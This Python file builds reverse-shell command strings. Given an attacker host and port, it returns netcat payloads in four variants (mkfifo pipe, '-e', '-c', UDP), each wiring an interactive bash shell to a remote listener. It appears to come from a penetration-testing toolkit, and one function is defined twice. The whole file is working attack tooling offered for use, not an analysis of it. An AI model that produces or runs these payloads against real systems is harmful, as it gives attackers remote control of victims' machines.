import logging

from enum import Enum
from typing import Optional

logger = logging.getLogger(__name__)

class NetcatPayloadType(Enum):
    NETCAT_MKFIFO = 0
    NETCAT_E = 1
    NETCAT_C = 2
    NETCAT_UDP = 3

def generate_netcat_payload(
    lhost: str,
    lport: int,
    netcat_path: str = "/bin/nc",
    shell_path: str = "/bin/bash",
    payload_type: NetcatPayloadType = NetcatPayloadType.NETCAT_MKFIFO,
) -> Optional[str]:
    payload: Optional[str] = None

    match payload_type:
        case NetcatPayloadType.NETCAT_MKFIFO:
            payload = generate_netcat_mkfifo_payload(lhost, lport, netcat_path, shell_path)
        case NetcatPayloadType.NETCAT_E:
            payload = generate_netcat_e_payload(lhost, lport, netcat_path, shell_path)
        case NetcatPayloadType.NETCAT_C:
            payload = generate_netcat_c_payload(lhost, lport, netcat_path, shell_path)
        case NetcatPayloadType.NETCAT_UDP:
            payload = generate_netcat_udp_payload(lhost, lport, netcat_path, shell_path)
        case _:
            logger.error("unknown netcat payload type")
            pass

    return payload

def generate_netcat_mkfifo_payload(
    lhost: str,
    lport: int,
    netcat_path: str,
    shell_path: str,
) -> str:
    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell_path} -i 2>&1|{netcat_path} {lhost} {lport} >/tmp/f"

def generate_netcat_e_payload(
    lhost: str,
    lport: int,
    netcat_path: str,
    shell_path: str,
) -> str:
    return f"{netcat_path} {lhost} {lport} -e {shell_path}"

def generate_netcat_c_payload(
    lhost: str,
    lport: int,
    netcat_path: str,
    shell_path: str,
) -> str:
    return f"{netcat_path} -c {shell_path} {lhost} {lport}"

def generate_netcat_c_payload(
    lhost: str,
    lport: int,
    netcat_path: str,
    shell_path: str,
) -> str:
    return f"{netcat_path} -c {shell_path} {lhost} {lport}"

def generate_netcat_udp_payload(
    lhost: str,
    lport: int,
    netcat_path: str,
    shell_path: str,
) -> str:
    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell_path} -i 2>&1|{netcat_path} -u {lhost} {lport} >/tmp/f"
